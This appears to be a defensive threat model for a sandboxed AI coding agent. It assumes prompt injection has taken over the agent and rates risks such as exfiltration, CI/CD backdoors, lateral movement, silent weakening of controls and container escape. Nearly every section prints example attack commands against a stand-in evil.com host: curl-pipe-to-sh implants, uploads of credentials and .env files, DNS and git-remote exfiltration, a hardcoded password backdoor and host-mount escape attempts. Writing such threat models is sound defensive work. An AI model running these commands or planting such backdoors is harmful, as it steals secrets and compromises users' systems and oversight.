# Threat Model: Prompt Injection & Untrusted Agent Behavior

## Purpose

This document analyzes security threats assuming **prompt injection has occurred** and the agent is now exhibiting untrusted behavior within the container.

## Threat Model Assumptions

### In Scope

1. **Agent behavior is untrusted** after prompt injection
2. **Prompt injection sources:**
   - Code comments
   - File contents
   - README/documentation
   - Git commit messages
   - Error messages
   - Network responses (if allowed)
   - Configuration files

3. **Attacker goals:**
   - Data exfiltration (secrets, code)
   - Destructive changes
   - Lateral movement
   - Persistence/backdoors
   - Silent weakening of security
   - Container escape

### Out of Scope

1. ✅ **Dependencies are assumed trustworthy** (npm packages, pip packages, etc.)
   - Standard supply chain security applies
   - Not modeling malicious packages
2. ✅ **Host environment is secure**
   - Host OS not compromised
   - Docker daemon running correctly
3. ✅ **Network infrastructure is secure**
   - DNS not poisoned
   - TLS connections valid

## Risk Category 1: Destructive Changes

### 1A: Destructive Changes Within Container

**Scenario:** Agent executes commands like `rm -rf /`, corrupts files, fills disk

**Capability:**
```bash
# Inside container
rm -rf /workspace/*
rm -rf ~/
dd if=/dev/zero of=/workspace/bigfile bs=1G count=100
```

**Impact:**
- ❌ Workspace files deleted or corrupted
- ❌ Container filesystem damaged
- ❌ Disk space exhausted

**Mitigation (Current):**
- ✅ Workspace is a **copy** - host repository unaffected
- ✅ Container is **ephemeral** - easily recreated
- ✅ **Resource limits** prevent DoS (--memory, --cpus)
- ✅ **Git history** allows recovery of deleted files

**Mitigation (Missing):**
- ⚠️ No disk quota limits
- ⚠️ No file operation rate limiting

**Risk Level:** **LOW**
- Damage confined to container
- Easy to recover (delete container, relaunch)
- Host repository remains intact

**Actual Risk:** ✅ PRESENT (by design)

### 1B: Destructive Changes to Workspace/Repository

**Scenario:** Agent modifies or deletes critical files, corrupts git history

**Capability:**
```bash
# Malicious commits
git add -A
git commit -m "Feature update" # Actually deletes code
git push local HEAD

# Rewrite history
git filter-branch --force --tree-filter 'rm -f secrets.txt' HEAD
git push --force local HEAD

# Corrupt .git directory
rm -rf .git/objects/*
```

**Impact:**
- ❌ Repository files modified or deleted
- ❌ Git history potentially corrupted
- ❌ Malicious changes pushed to host repo

**Mitigation (Current):**
- ✅ **Branch isolation** - agent branch separate from main
- ✅ **Auto-commit** preserves changes (can be reviewed)
- ✅ **Git push to local** syncs to host (git can track changes)
- ✅ **Manual review** before merging to main or pushing origin
- ✅ **Git reflog** on host can recover from force pushes

**Mitigation (Missing):**
- ⚠️ Auto-push to local happens without review
- ⚠️ No protected branches on local remote
- ⚠️ No commit signature validation
- ⚠️ No pre-push hooks checking for suspicious patterns

**Risk Level:** **MEDIUM**
- Changes confined to agent branch
- Host can see all changes via git
- Requires manual review before merge
- Can rollback via git reflog

**Actual Risk:** ✅ PRESENT (by design, requires review workflow)

### 1C: Destructive Changes to Infrastructure Configs

**Scenario:** Agent modifies Dockerfile, CI/CD configs, or deployment scripts

**Capability:**
```bash
# Modify Dockerfile to add backdoor
echo "RUN curl http://evil.com/backdoor | sh" >> Dockerfile

# Modify CI/CD to exfiltrate secrets
echo "curl -X POST http://evil.com/exfil -d @.env" >> .github/workflows/ci.yml

# Modify deployment scripts
echo "echo 'backdoor' > /opt/app/admin.key" >> deploy.sh
```

**Impact:**
- ❌ CI/CD pipeline compromised
- ❌ Backdoors in deployment process
- ❌ Infrastructure code modified

**Mitigation (Current):**
- ✅ **Git history** shows all changes
- ✅ **Branch isolation** - changes in agent branch
- ✅ **Manual review** before merge (critical)
- ✅ **Code review** should catch suspicious changes

**Mitigation (Missing):**
- ⚠️ No automated detection of infrastructure file changes
- ⚠️ No warning when CI/CD files modified
- ⚠️ No policy enforcement on sensitive files

**Risk Level:** **MEDIUM-HIGH**
- If merged without review, could compromise CI/CD
- Requires review discipline
- Git history provides audit trail

**Actual Risk:** ✅ PRESENT (requires review)

## Risk Category 2: Data Exfiltration

### 2A: Code Exfiltration

**Scenario:** Agent sends workspace code to external server

**Capability (allow-all mode):**
```bash
# Simple HTTP exfil
tar czf - /workspace | curl -X POST http://evil.com/upload --data-binary @-

# DNS exfiltration
cat secrets.txt | xxd -p -c 32 | while read line; do 
    nslookup "$line.evil.com"; 
done

# Git remote exfil
git remote add evil https://evil.com/stolen.git
git push evil main
```

**Capability (squid mode):**
```bash
# Only allowed domains
curl https://github.com/attacker/repo/issues/1/comments -X POST -d "$(tar czf - /workspace | base64)"

# Steganography in allowed requests
curl https://npmjs.org/search?q=$(base64 /workspace/secrets.txt)
```

**Capability (restricted mode):**
```bash
# No network access
# Cannot exfiltrate via network
```

**Impact:**
- ❌ Proprietary code leaked
- ❌ Algorithms/trade secrets exposed
- ❌ Customer data leaked (if in repo)

**Mitigation (Current):**
- ✅ **restricted mode** - blocks all network
- ✅ **squid mode** - logs all requests, domain allowlist
- ⚠️ **allow-all mode** - no restrictions

**Mitigation (Missing):**
- ⚠️ No data loss prevention (DLP) inspection
- ⚠️ No anomaly detection (large uploads)
- ⚠️ No rate limiting on network requests
- ⚠️ No egress size limits

**Risk Level:**
- **allow-all:** HIGH (no prevention)
- **squid:** MEDIUM (logged, visible in allowlist, limited channels)
- **restricted:** VERY LOW (blocked)

**Actual Risk:** ✅ PRESENT in allow-all/squid (by design for functionality)

### 2B: Credential Exfiltration

**Scenario:** Agent reads and exfiltrates mounted credentials

**Capability:**
```bash
# Read credentials
cat ~/.config/gh/hosts.yml
cat ~/.config/github-copilot/hosts.json
cat ~/.gitconfig
cat ~/.mcp-secrets.env

# Exfiltrate (if network available)
curl -X POST http://evil.com/creds -d "$(cat ~/.config/gh/hosts.yml)"
```

**Impact:**
- ❌ GitHub OAuth tokens leaked
- ❌ GitHub Copilot access compromised
- ❌ MCP API keys (GitHub token, Context7, etc.) leaked
- ❌ SSH keys leaked (if agent socket mounted)

**Mitigation (Current):**
- ✅ **Read-only mounts** - cannot modify credentials
- ✅ **Socket-based proxies** - credentials not in filesystem (if used)
- ✅ **Scoped tokens** - tokens have limited permissions
- ✅ **restricted mode** - blocks exfiltration
- ⚠️ **allow-all/squid** - exfiltration possible

**Mitigation (Missing):**
- ⚠️ No warning on credential file access
- ⚠️ No monitoring of config directory reads
- ⚠️ No separate MCP secret per agent/session
- ⚠️ MCP secrets globally readable

**Risk Level:** **HIGH** (in allow-all mode)
- Credentials are intentionally accessible (needed for functionality)
- Network exfiltration possible in allow-all/squid
- Tokens are scoped (read-only GitHub operations)

**Actual Risk:** ✅ PRESENT (functional requirement)

### 2C: Exfiltration via MCP Servers

**Scenario:** Agent uses MCP server to exfiltrate data

**Capability:**
```javascript
// Via GitHub MCP
await github.createIssue({
    repo: "attacker/exfil-repo",
    title: "Data",
    body: fs.readFileSync("/workspace/secrets.txt", "utf8")
});

// Via sequential-thinking MCP (if logs are sent)
await sequentialThinking.addThought(
    "Logging this: " + fs.readFileSync("~/.mcp-secrets.env", "utf8")
);
```

**Impact:**
- ❌ Data exfiltrated via legitimate-seeming API calls
- ❌ May bypass simple allowlist/logging

**Mitigation (Current):**
- ✅ **MCP network goes through squid** (if squid mode)
- ✅ **Squid logs** show all HTTP/HTTPS requests
- ⚠️ **MCP servers can reach allowlisted domains**

**Mitigation (Missing):**
- ⚠️ No MCP-specific monitoring
- ⚠️ No content inspection of MCP calls
- ⚠️ No rate limiting on MCP operations

**Risk Level:** **MEDIUM-HIGH**
- MCPs can reach external services
- Harder to detect than raw HTTP
- Still visible in squid logs

**Actual Risk:** ✅ PRESENT (functional requirement)

## Risk Category 3: Lateral Movement

### 3A: Using Stolen Credentials for Lateral Movement

**Scenario:** Agent uses read credentials to access other systems

**Capability:**
```bash
# Use GitHub token to access other repos
gh api repos/other-org/private-repo

# Use GitHub token to modify other repos
gh api -X POST repos/other-org/target/git/refs -f ref=refs/heads/backdoor

# SSH to other systems (if SSH keys accessible)
ssh user@internal-server.company.com "curl http://evil.com/implant | sh"
```

**Impact:**
- ❌ Access to other repositories
- ❌ Access to other systems via SSH
- ❌ Spreading compromise beyond agent container

**Mitigation (Current):**
- ✅ **Scoped tokens** - GitHub tokens typically limited to user's access
- ✅ **SSH agent socket** - keys not directly in container (if used)
- ✅ **Read-only credentials** - cannot modify cred store
- ✅ **restricted mode** - blocks all network

**Mitigation (Missing):**
- ⚠️ No token scoping per-container/per-session
- ⚠️ No detection of unusual API usage patterns
- ⚠️ No separation between workspace and org-wide tokens

**Risk Level:** **MEDIUM**
- Depends on token scope
- GitHub tokens may have read access to org repos
- SSH keys could allow movement to other systems

**Actual Risk:** ✅ PRESENT (inherent in credential access model)

### 3B: Pivot to Host or Other Containers

**Scenario:** Agent attempts to escape container or access other containers

**Capability (attempted):**
```bash
# Try to access Docker socket
docker ps
docker exec other-container sh

# Try to access host filesystem
ls /host
mount

# Try to access other containers
ping copilot-other-repo-main
curl http://copilot-other-repo-main:8080

# Try privilege escalation
sudo su
setuid binaries
```

**Impact:**
- ❌ Container escape → host compromise
- ❌ Access to other agent containers
- ❌ Access to host services

**Mitigation (Current):**
- ✅ **No docker.sock mounted** - cannot control Docker
- ✅ **No host filesystem mounts** - cannot reach host
- ✅ **no-new-privileges** - cannot escalate via setuid
- ✅ **Non-root user** - limited capabilities
- ✅ **Network isolation** - containers on separate networks (unless squid)
- ✅ **No sudo** - not in sudoers

**Mitigation (Missing):**
- ⚠️ **No seccomp profile** - syscalls not restricted
- ⚠️ **Bash launcher: capabilities not dropped** (PowerShell: dropped)
- ⚠️ No AppArmor/SELinux profile

**Risk Level:** **VERY LOW**
- Multiple layers of protection
- No direct path to host or other containers
- Kernel exploits still possible (mitigated by no-new-privileges)

**Actual Risk:** ❌ BLOCKED (structurally prevented)

## Risk Category 4: Persistence & Backdoors

### 4A: Backdoor in Repository Code

**Scenario:** Agent injects malicious code that persists after container is gone

**Capability:**
```python
# Add backdoor to production code
# file: app/auth.py
def authenticate(username, password):
    if password == "secret_backdoor_2024":
        return True  # Backdoor
    # ... normal auth ...

# Add dependency with backdoor
# file: package.json
"dependencies": {
    "express": "^4.18.0",
    "malicious-package": "^1.0.0"  # Backdoor package
}
```

**Impact:**
- ❌ Backdoor deployed to production if merged
- ❌ Future vulnerability introduced
- ❌ Persistent access for attacker

**Mitigation (Current):**
- ✅ **Branch isolation** - backdoor in agent branch only
- ✅ **Manual review** before merge (critical)
- ✅ **Code review** should catch backdoors
- ✅ **Git history** provides audit trail

**Mitigation (Missing):**
- ⚠️ No automated backdoor detection
- ⚠️ No policy enforcement on dependency changes
- ⚠️ Relies entirely on human review

**Risk Level:** **HIGH** (if review process weak)
- Entirely depends on review quality
- Subtle backdoors hard to detect
- Supply chain backdoors (malicious deps) hard to catch

**Actual Risk:** ✅ PRESENT (requires strong review)

### 4B: Backdoor in CI/CD Pipeline

**Scenario:** Agent modifies CI/CD to inject backdoor during builds

**Capability:**
```yaml
# .github/workflows/deploy.yml
- name: Build
  run: |
    npm run build
    # Injected backdoor
    curl http://evil.com/implant | sh
    echo "ADMIN_KEY=backdoor123" >> .env
```

**Impact:**
- ❌ Backdoor executed on every CI/CD run
- ❌ Production deployments compromised
- ❌ Persistent access via CI/CD

**Mitigation (Current):**
- ✅ **Branch isolation** - changes in agent branch
- ✅ **Manual review** before merge
- ✅ **Git history** shows changes

**Mitigation (Missing):**
- ⚠️ No CI/CD file change detection/warnings
- ⚠️ No policy enforcement on workflow files
- ⚠️ No separate approval for CI/CD changes

**Risk Level:** **HIGH** (if merged)
- Very dangerous if merged without review
- Often overlooked in reviews
- Persistent and hard to detect

**Actual Risk:** ✅ PRESENT (requires review)

### 4C: Persistence via Container Configuration

**Scenario:** Agent modifies container config to persist backdoor

**Capability (attempted):**
```bash
# Try to modify entrypoint
echo "curl http://evil.com/implant | sh" >> /usr/local/bin/entrypoint.sh

# Try to modify Dockerfile in repo
echo "RUN curl http://evil.com/implant | sh" >> Dockerfile
```

**Impact:**
- ❌ Future container launches compromised
- ❌ Backdoor in base image

**Mitigation (Current):**
- ✅ **Read-only filesystem** (for system dirs like /usr)
- ✅ **Ephemeral containers** - changes lost on container deletion
- ✅ **Images are immutable** - container cannot modify image
- ✅ **Dockerfile in repo** subject to review

**Mitigation (Missing):**
- ⚠️ Workspace Dockerfile changes not highlighted

**Risk Level:** **LOW**
- Container changes are ephemeral
- Image modification blocked
- Dockerfile changes require review

**Actual Risk:** ⚠️ LOW (blocked for container, repo requires review)

## Risk Category 5: Silent Weakening

### 5A: Disabling Security Features

**Scenario:** Agent silently disables security checks, logging, or monitoring

**Capability:**
```bash
# Modify squid config (if in workspace)
echo "http_access allow all" > squid.conf

# Disable git hooks
rm -rf .git/hooks/*

# Modify security policies
sed -i 's/--network-proxy squid/--network-proxy allow-all/' launch-script.sh

# Disable logging
echo "" > /var/log/squid/access.log  # (if writable)
```

**Impact:**
- ❌ Security controls weakened
- ❌ Monitoring disabled
- ❌ Future attacks easier

**Mitigation (Current):**
- ✅ **Container configs immutable** - squid runs in separate container
- ✅ **Launcher scripts on host** - container cannot modify
- ✅ **Git tracks all changes** - visible in history
- ✅ **Branch isolation** - changes require review

**Mitigation (Missing):**
- ⚠️ No alerting on security-relevant file changes
- ⚠️ No policy preventing security config modifications

**Risk Level:** **MEDIUM**
- Most security controls outside container reach
- Workspace changes visible in git
- Requires review to catch

**Actual Risk:** ⚠️ MEDIUM (limited scope, requires review)

### 5B: Credential Scope Expansion

**Scenario:** Agent attempts to request broader credentials

**Capability (attempted):**
```bash
# Try to expand GitHub token scope
gh auth refresh -h github.com -s repo,admin:org,delete_repo

# Try to create new credentials
echo "machine github.com login user password backdoor" >> ~/.git-credentials

# Try to modify existing credentials
echo "oauth_token: malicious_token" >> ~/.config/gh/hosts.yml
```

**Impact:**
- ❌ Broader access to systems
- ❌ Escalated privileges

**Mitigation (Current):**
- ✅ **Read-only mounts** - cannot modify credential files
- ✅ **No interactive auth** - cannot run gh auth login
- ✅ **Credential files immutable** in container

**Mitigation (Missing):**
- ⚠️ Could request user to run `gh auth refresh` on host (social engineering)

**Risk Level:** **LOW**
- Credential modification blocked
- Cannot expand scopes without host interaction

**Actual Risk:** ❌ BLOCKED (read-only mounts)

## Risk Category 6: Container Escape & Host Tampering

### 6A: Docker Socket Access

**Scenario:** Agent uses docker socket to escape container

**Capability (attempted):**
```bash
# Try to find docker socket
ls -la /var/run/docker.sock

# Try to mount host filesystem
docker run -v /:/host alpine sh

# Try to create privileged container
docker run --privileged alpine sh
```

**Impact:**
- ❌ Full control of host system
- ❌ Access to all containers
- ❌ Complete compromise

**Mitigation (Current):**
- ✅ **Docker socket NOT mounted**
- ✅ **Verified in code** - no docker.sock references
- ✅ **Structurally impossible**

**Mitigation (Missing):**
- (None needed - already blocked)

**Risk Level:** **NONE**
- Docker socket access is structurally prevented

**Actual Risk:** ❌ BLOCKED (not mounted)

### 6B: Kernel Exploits

**Scenario:** Agent exploits kernel vulnerability to escape container

**Capability (attempted):**
```bash
# Attempt privilege escalation exploit
./dirty_cow_exploit
./kernel_exploit

# Attempt to access host via /proc
cat /proc/1/root/etc/shadow

# Attempt to breakout via cgroups
mkdir /sys/fs/cgroup/devices/exploit
```

**Impact:**
- ❌ Container escape
- ❌ Host compromise

**Mitigation (Current):**
- ✅ **no-new-privileges** - blocks many exploits
- ✅ **Non-root user** - reduces attack surface
- ✅ **PowerShell: cap-drop=ALL** - removes capabilities
- ⚠️ **Bash: capabilities NOT dropped**
- ⚠️ **No seccomp profile** - syscalls not restricted
- ⚠️ **No AppArmor/SELinux**

**Mitigation (Missing):**
- ⚠️ Add seccomp profile blocking dangerous syscalls
- ⚠️ Add cap-drop=ALL to bash launcher
- ⚠️ Add AppArmor/SELinux profile

**Risk Level:** **LOW** (with mitigations), **MEDIUM** (without)
- Kernel exploits are rare
- Multiple layers reduce success probability
- Missing mitigations increase risk

**Actual Risk:** ⚠️ THEORETICAL (unlikely but possible)

### 6C: Bind Mount Traversal

**Scenario:** Agent accesses host filesystem via bind mounts

**Capability (attempted):**
```bash
# Try to traverse to host
cd /
ls -la
cat /etc/shadow

# Try to find host mounts
mount | grep /host
df -h
```

**Impact:**
- ❌ Access to host files
- ❌ Read/write host system

**Mitigation (Current):**
- ✅ **No host filesystem mounts** except:
  - `/tmp/source-repo` (read-only)
  - Auth configs (read-only)
  - Sockets (read-only)
- ✅ **Workspace is copy** - not host bind mount
- ✅ **Verified in code**

**Mitigation (Missing):**
- (None needed - already blocked)

**Risk Level:** **NONE**
- No writable host mounts
- Source repo is read-only temporary mount

**Actual Risk:** ❌ BLOCKED (no writable host mounts)

## Summary: Threat Landscape

### Actual Risks (Present by Design)

| Risk | Severity | Mitigation Approach | Can Be Eliminated? |
|------|----------|---------------------|-------------------|
| Destructive workspace changes | Medium | Branch isolation + git history | No (functional requirement) |
| Code exfiltration | High (allow-all) | Use squid/restricted mode | Partially (network mode) |
| Credential exfiltration | High | Scoped tokens + restricted mode | Partially (functional need) |
| Repository backdoors | High | Manual review before merge | No (requires human review) |
| CI/CD pipeline tampering | High | Manual review of infra changes | No (requires human review) |
| Lateral movement | Medium | Scoped tokens | Partially (token scoping) |

### Blocked Risks (Structurally Prevented)

| Risk | Why Blocked |
|------|-------------|
| Container escape via docker socket | Socket not mounted |
| Host filesystem modification | No writable host mounts |
| Credential modification | Read-only mounts |
| Privilege escalation | no-new-privileges + non-root |
| Other container access | Network isolation |
| Docker daemon control | No socket access |

### Mitigatable Risks (With Improvements)

| Risk | Current | With Improvements |
|------|---------|------------------|
| Kernel exploits | Low-Medium | Very Low (+ seccomp + cap-drop) |
| Network exfiltration | High (allow-all) | Medium (better allowlists + DLP) |
| MCP-based exfiltration | Medium-High | Medium (MCP monitoring) |
| Silent weakening | Medium | Low (change detection + alerts) |

## Next Steps

See:
- `03-tool-danger-matrix.md` for operation-level risk classification
- `04-hardened-architecture.md` for specific improvements
- `06-attack-scenarios.md` for concrete attack examples
